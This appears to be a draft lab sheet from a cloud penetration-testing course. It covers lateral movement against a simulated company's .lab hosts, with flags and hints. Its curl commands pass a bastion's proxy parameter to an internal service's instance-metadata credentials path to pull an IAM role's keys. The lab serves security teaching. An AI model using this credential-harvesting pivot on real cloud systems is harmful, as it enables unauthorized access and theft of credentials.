# Module 5 — Lab 2: Lateral Movement via Compute/Instance-Profile Pivoting

> **⚠️ PLANNED CONTENT — not yet built or deployed.** Describes the intended lab for
> review before implementation. Nothing below is live yet.

**Course:** Cloud Pentest — Module 5: Post-Exploitation, Persistence & Lateral Movement
**Target:** SoulSecure Inc. (simulated engagement, continued)
**Target host:** `https://bastion.soulsecure.lab/`
**Estimated time:** 75–100 minutes

---

## 1. Recap & scenario

Back in Module 3 Lab 5, the VPN portal handed you a jump-host SSH key you had no use
for at the time — the note even said the bastion it belonged to was "only reachable
once VPN-connected." That's now. This lab picks up the network side of things:
having a foothold on one host is rarely the end of a real engagement — it's usually
the way to reach a *second* host with different, sometimes broader, access.

> **Scope reminder:** `bastion.soulsecure.lab` and whatever it lets you reach from
> there.

## 2. Learning objectives

- Use a previously-collected SSH key as proof of access to a jump host
- Recognize that a foothold's real value is often what it can reach next, not what it
  can do itself
- Pivot to a second, internal-only compute resource from that foothold
- Retrieve and compare a second instance role's credentials against the first ones
  you obtained back in Module 3 — different host, different privilege

## 3. Tasks

### 3.1 — Prove you hold the key

`bastion.soulsecure.lab` checks for proof that you hold the jump-host private key
from Module 3 Lab 5 — specifically, its fingerprint:

```bash
ssh-keygen -lf jump-host-id_rsa -E md5
```

```bash
curl -sk https://bastion.soulsecure.lab/ -H "X-SSH-Key-Fingerprint: <fingerprint>"
```

### 3.2 — Look around from here

The bastion's dashboard includes a network diagnostic/proxy tool — a legitimate
feature for an ops team troubleshooting connectivity from this vantage point, and
exactly as useful to you as it is to them:

```bash
curl -sk "https://bastion.soulsecure.lab/proxy?url=http://internal-svc:8080/"
```

### 3.3 — Pull the second instance's metadata

`internal-svc` has its own instance metadata, reachable the same way you reached
`169.254.169.254` back in Module 3 Lab 2 — except this time, your reach comes from
being on the bastion's network, not from an application-level SSRF bug.

```bash
curl -sk "https://bastion.soulsecure.lab/proxy?url=http://internal-svc:8080/latest/meta-data/iam/security-credentials/"
```

Retrieve the role name it lists, then the credentials for that role.

### 3.4 — Harder mode: what else does this role reach?

Check this new role's permissions against `iam.soulsecure.lab` the same way you did
in Module 4 Lab 1. It has access to something you haven't seen mentioned anywhere
else in this engagement yet — note down what it points you toward.

## 4. Tools you'll want

- `curl`
- `ssh-keygen` (just for the `-lf` fingerprint calculation — you don't need to
  actually SSH anywhere in this lab)

## 5. Deliverable: Lateral Movement Path

| Hop | How reached | Credential/access obtained |
|---|---|---|
| Bastion | | |
| `internal-svc` | | |

**Flags found:**

- [ ] Flag 1 (bastion access via SSH key fingerprint): `flag{________________________________}`
- [ ] Flag 2 (`internal-svc` metadata via bastion proxy): `flag{________________________________}`
- [ ] Flag 3 (`internal-svc` instance role credentials): `flag{________________________________}`
- [ ] Flag 4 (harder mode — discovered what this role can reach next): `flag{________________________________}`

## 6. Hints

<details>
<summary>Hint 1 — fingerprint format</summary>

`ssh-keygen -lf <keyfile> -E md5` prints something like `2048 MD5:aa:bb:cc:... comment
(RSA)` — the header only needs the hash portion.
</details>

<details>
<summary>Hint 2 — the proxy tool's parameter</summary>

Same shape as Module 3 Lab 2's SSRF endpoint on purpose — `url` query parameter,
plain GET. If you remember that lab, this one should feel familiar.
</details>

<details>
<summary>Hint 3 — the internal service's address</summary>

`internal-svc:8080` is a Docker-internal service name — it will never resolve from
your attack box directly, only through the bastion's proxy.
</details>

## 7. Known limitations

This lab simplifies "VPN-connected network access" into a single fingerprint-gated
HTTP check rather than a working OpenVPN tunnel (the `.ovpn` config from Module 3 Lab
5 was never functional — see that lab's Known Limitations). The bastion's `/proxy`
feature is a deliberately simplified stand-in for genuine network pivoting.

## 8. Next up

Lab 3 (Container/Cluster Escape & Lateral Movement) picks up exactly where this
lab's harder mode pointed — the thing `internal-svc`'s role can reach that nothing
else in this engagement has mentioned yet.
